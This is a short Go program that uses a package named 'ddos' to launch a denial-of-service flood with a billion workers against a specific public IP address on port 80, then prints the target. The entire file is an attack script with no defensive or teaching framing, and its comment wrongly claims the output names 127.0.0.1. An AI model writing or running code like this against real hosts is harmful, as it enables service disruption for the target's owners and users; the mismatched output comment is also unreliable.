package main

import (
	"fmt"
	"time"
	"yhgolang/ddos"
)

func main() {
	workers := 1000000000
	d, err := ddos.New("http://161.117.188.78:80", workers)
	if err != nil {
		panic(err)
	}
	d.Run()
	time.Sleep(time.Second)
	d.Stop()
	fmt.Println("DDoS attack server: http://161.117.188.78:80")
	// Output: DDoS attack server: http://127.0.0.1:80
}
